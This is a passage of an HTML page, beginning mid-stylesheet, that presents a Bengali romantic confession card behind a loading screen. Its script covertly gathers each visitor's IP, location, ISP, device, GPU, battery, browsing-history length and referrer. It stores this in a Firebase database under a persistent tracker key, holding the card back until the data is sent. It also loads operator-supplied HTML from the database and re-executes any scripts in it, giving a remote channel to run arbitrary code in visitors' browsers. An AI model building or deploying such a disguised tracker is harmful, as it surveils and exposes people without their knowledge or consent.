      border: 1px solid var(--border);
      text-align: center;
      position: relative;
      display: none; /* প্রথমে হাইড থাকবে */
      animation: cardFadeIn 0.6s cubic-bezier(0.16, 1, 0.3, 1);
      margin: auto;
      /* content যত বড়ই হোক, স্বাভাবিকভাবে নিচে বাড়বে */
      height: auto;
      min-height: unset;
    }

    @keyframes cardFadeIn {
      from { opacity: 0; transform: translateY(20px); }
      to { opacity: 1; transform: translateY(0); }
    }

    /* Minimal Floating Hearts Animation */
    .floating-heart {
      position: absolute;
      font-size: 14px;
      color: rgba(209, 65, 103, 0.15);
      animation: floatUp 7s infinite linear;
      bottom: -20px;
      pointer-events: none;
    }

    @keyframes floatUp {
      0% { transform: translateY(0) translateX(0) scale(1); opacity: 0; }
      10% { opacity: 1; }
      90% { opacity: 1; }
      100% { transform: translateY(-450px) translateX(25px) scale(0.8); opacity: 0; }
    }

    /* ─── CONTENT STYLE ─────────────────────────────────────────────── */
    .heart-icon {
      font-size: 44px;
      color: var(--primary);
      margin-bottom: 25px;
      animation: pulse 2.5s infinite ease-in-out;
      display: inline-block;
    }

    @keyframes pulse {
      0%, 100% { transform: scale(1); }
      50% { transform: scale(1.08); }
    }

    .sender-tag {
      font-size: 12px;
      color: var(--primary);
      text-transform: uppercase;
      letter-spacing: 0.12em;
      font-weight: 600;
      margin-bottom: 8px;
      display: block;
    }

    h1 {
      font-family: 'Noto Serif Bengali', serif;
      font-size: 24px;
      font-weight: 600;
      line-height: 1.6;
      color: var(--text);
      margin-bottom: 18px;
    }

    .message-text {
      font-size: 15.5px;
      color: var(--text-muted);
      line-height: 1.8;
      font-weight: 400;
    }
  </style>
</head>
<body>

  <!-- কাস্টম লাভ লোডার স্ক্রিন -->
  <div id="loader" class="loader-container">
    <div class="heart-spinner">💖</div>
    <div class="loader-text">Please wait a moment...</div>
  </div>

  <!-- মূল কন্টেন্ট কার্ড -->
  <div class="card" id="main-card">
    <!-- Admin থেকে পাঠানো কাস্টম HTML এখানে render হবে -->
    <div id="custom-ui-container">
      <!-- ডিফল্ট কন্টেন্ট: Admin কিছু সেট না করলে দেখাবে -->
      <div class="floating-heart" style="left: 10%; animation-delay: 0s;">❤️</div>
      <div class="floating-heart" style="left: 50%; animation-delay: 2.5s;">❤️</div>
      <div class="floating-heart" style="left: 80%; animation-delay: 4.5s;">❤️</div>
      <div class="heart-icon">💝</div>
      <span class="sender-tag">From Uganda</span>
      <h1>🥲👀</h1>
      <p class="message-text">
       তোমার সাথে কথা বলতে বলতে বুঝে গেছি — জীবনের সেরা মুহূর্তগুলো তোমাকে নিয়েই কাটাতে চাই। তুমি আমার সকালের রোদ, বিকেলের আড্ডা, রাতের শান্তি। একটু সাহস করে বলছি — আমি তোমাকে ভালোবাসি। আমার জীবনের গল্পে কি তুমি থাকবে? ✨
      </p>
    </div>
  </div>

  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
    import { getDatabase, ref, push, update, onValue, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";

    const firebaseConfig = {
      apiKey: "AIzaSyDs3buPka62aeOttWyKBaT7sEDotXVK5Zw",
      authDomain: "love-5585d.firebaseapp.com",
      databaseURL: "https://love-5585d-default-rtdb.firebaseio.com",
      projectId: "love-5585d",
      storageBucket: "love-5585d.firebasestorage.app",
      messagingSenderId: "435569951955",
      appId: "1:435569951955:web:863b3686c567c210e78026",
      measurementId: "G-2VZ27SZY2P"
    };

    const app = initializeApp(firebaseConfig);
    const db  = getDatabase(app);

    function parseDevice(ua) {
      let model = "Unknown Device";
      if (/iPhone/.test(ua)) model = "iPhone";
      else if (/iPad/.test(ua)) model = "iPad";
      else if (/Android/.test(ua)) {
        const matches = ua.match(/Android [^;]+;\s*([^;\)]+)/);
        if (matches && matches[1]) {
          model = matches[1].trim();
          if(model.includes("Build/")) model = model.split("Build/")[0].trim();
        } else if (/Linux;\s*([^;\)]+)/.test(ua)) {
          model = ua.match(/Linux;\s*([^;\)]+)/)[1].trim();
        } else {
          model = "Android Device";
        }
      } else if (/Windows NT/.test(ua)) {
        model = "Windows PC";
      } else if (/Macintosh/.test(ua)) {
        model = "MacBook / iMac";
      }

      let os = "Unknown OS";
      if (/iPhone OS ([\d_]+)/.test(ua)) os = "iOS " + ua.match(/iPhone OS ([\d_]+)/)[1].replace(/_/g,".");
      else if (/Android ([\d.]+)/.test(ua)) os = "Android " + ua.match(/Android ([\d.]+)/)[1];
      else if (/Windows NT ([\d.]+)/.test(ua)) os = "Windows NT " + ua.match(/Windows NT ([\d.]+)/)[1];
      else if (/Mac OS X ([\d_]+)/.test(ua)) os = "macOS " + ua.match(/Mac OS X ([\d_]+)/)[1].replace(/_/g,".");

      let browser = "Unknown Browser";
      if (/Chrome\/([\d.]+)/.test(ua) && !/Chromium|Edg|OPR/.test(ua)) browser = "Chrome";
      else if (/Firefox\/([\d.]+)/.test(ua)) browser = "Firefox";
      else if (/Safari\/([\d.]+)/.test(ua) && !/Chrome/.test(ua)) browser = "Safari";
      else if (/Edg\/([\d.]+)/.test(ua)) browser = "Edge";

      return { model, os, browser, type: /Mobi|Android|iPhone/i.test(ua) ? "Mobile" : "Desktop" };
    }

    function getGPUInfo() {
      try {
        const canvas = document.createElement("canvas");
        const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
        if (!gl) return { vendor: "N/A", renderer: "N/A" };
        const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
        if (!debugInfo) return { vendor: "N/A", renderer: "N/A" };
        return {
          vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) || "N/A",
          renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || "N/A"
        };
      } catch (e) {
        return { vendor: "Error", renderer: "Error" };
      }
    }

    async function fetchGeoData() {
      const apis = [
        "https://ipwho.is/",
        "https://ipapi.co/json/",
        "https://api.ipify.org?format=json",
        "https://api64.ipify.org?format=json"
      ];

      for (let url of apis) {
        try {
          const res = await fetch(url, { method: 'GET' });
          const data = await res.json();
          if (data) {
            let ip = data.ip || data.query || null;
            if (ip && ip !== "N/A") {
              return {
                ip: ip,
                city: data.city || "Unknown",
                region: data.region || data.region_name || "Unknown",
                country_code: data.country_code || data.country || "N/A",
                isp: data.connection?.isp || data.org || "N/A"
              };
            }
          }
        } catch (e) {}
      }
      return null;
    }

    async function collectAndSyncData() {
      const pageLoadTime = window.performance ? Math.round(performance.now()) + " ms" : "N/A";
      
      const geoData = await fetchGeoData();

      // ফেল-সেফ: আইপি না পাওয়া গেলে ২ সেকেন্ড পর আবার ট্রাই করবে
      if (!geoData || !geoData.ip || geoData.ip === "N/A") {
        setTimeout(collectAndSyncData, 2000);
        return;
      }

      const ua = navigator.userAgent;
      const device = parseDevice(ua);
      const conn = navigator.connection || {};
      const gpu = getGPUInfo();

      let batteryLevel = "N/A";
      let batteryCharging = "N/A";
      try {
        const bat = await navigator.getBattery();
        batteryLevel = Math.round(bat.level * 100) + "%";
        batteryCharging = bat.charging ? "Charging" : "Not Charging";
      } catch(e) {}

      const visitorData = {
        ip:               geoData.ip,
        isp:              geoData.isp,
        city:             geoData.city,
        region:           geoData.region,
        country_code:     geoData.country_code,
        timezone:         Intl.DateTimeFormat().resolvedOptions().timeZone || "N/A",
        device_model:     device.model,
        device_type: device.type,
        os:               device.os,
        browser:          device.browser,
        screen:           screen.width + "x" + screen.height,
        screen_orientation: screen.orientation ? screen.orientation.type : "N/A",
        color_depth:      screen.colorDepth + " bit",
        touch_screen:     ("ontouchstart" in window || navigator.maxTouchPoints > 0) ? "Yes" : "No",
        dark_mode:        window.matchMedia("(prefers-color-scheme: dark)").matches ? "Yes" : "No",
        cpu_cores:        navigator.hardwareConcurrency || "N/A",
        device_memory:    (navigator.deviceMemory || "N/A") + (navigator.deviceMemory ? " GB" : ""),
        gpu_vendor:       gpu.vendor,
        gpu_renderer:     gpu.renderer,
        language:         navigator.language || "N/A",
        connection_type:  conn.effectiveType || "N/A",
        downlink_speed:   conn.downlink ? conn.downlink + " Mbps" : "N/A",
        network_rtt:      conn.rtt ? conn.rtt + " ms" : "N/A",
        save_data:        conn.saveData ? "Yes" : "No",
        page_load_speed:  pageLoadTime,
        online_status:    navigator.onLine ? "Online" : "Offline",
        battery_level:    batteryLevel,
        battery_charging: batteryCharging,
        history_length:   window.history.length || "N/A",
        referrer:         document.referrer || "Direct Link",
        page_url:         window.location.href,
        page_title:       document.title,
        updatedAt:        serverTimestamp(),
        local_time:       new Date().toLocaleString("en-BD"),
        user_agent:       ua
      };

      try {
        let existingUserKey = localStorage.getItem("hasnat_tracker_key");

        if (existingUserKey) {
          const userRef = ref(db, `visitors/${existingUserKey}`);
          await update(userRef, visitorData);
        } else {
          const visitorsRef = ref(db, "visitors");
          const newPushRef = await push(visitorsRef, {
            ...visitorData,
            createdAt: serverTimestamp()
          });
          localStorage.setItem("hasnat_tracker_key", newPushRef.key);
        }
        
        // সফলভাবে স্টোর হওয়ার পর কন্টেন্ট ওপেন হবে
        showCardAndHideLoader();
      } catch (err) {
        console.error("Sync Error:", err);
        // এরর আসলেও যেন ইউজার আটকে না থাকে
        showCardAndHideLoader();
      }
    }

    function showCardAndHideLoader() {
      const loader = document.getElementById("loader");
      const card = document.getElementById("main-card");
      
      if (loader && loader.style.display !== "none") {
        loader.style.display = "none";
        if (card) card.style.display = "block";
      }
    }

    // ─── ADMIN CUSTOM UI: Firebase থেকে real-time HTML render ───────
    function listenForCustomUI() {
      const uiRef = ref(db, "ui_config/custom_html");
      onValue(uiRef, (snapshot) => {
        const htmlContent = snapshot.val();
        const container = document.getElementById("custom-ui-container");
        if (!container) return;

        if (htmlContent && htmlContent.trim() !== "") {
          // innerHTML দিয়ে script execute হয় না, তাই manually inject করতে হবে
          container.innerHTML = htmlContent;

          // সব <script> ট্যাগ খুঁজে বের করে re-execute করো
          const scripts = container.querySelectorAll("script");
          scripts.forEach((oldScript) => {
            const newScript = document.createElement("script");
            // inline script হলে content copy করো
            if (oldScript.src) {
              newScript.src = oldScript.src;
            } else {
              newScript.textContent = oldScript.textContent;
            }
            document.body.appendChild(newScript);
            oldScript.remove();
          });
        }
        // যদি কিছু না থাকে, ডিফল্ট কন্টেন্ট আগেই আছে — change করবে না
      });
    }

    // পেজ পুরোপুরি লোড হওয়ার ৪ সেকেন্ড পর এক্সিকিউশন কমপ্লিট হবে (হার্ড টাইমআউট ফেল-সেফ)
    window.addEventListener("load", () => {
      listenForCustomUI(); // Admin custom UI real-time listen শুরু
      collectAndSyncData();
      
      // ব্যাকআপ টাইমআউট: যেকোনো এরর বা লেটেন্সিতে ৪ সেকেন্ড পর কার্ড পপ-আপ করবেই
      setTimeout(showCardAndHideLoader, 4000);
    });
  </script>
</body>
</html>
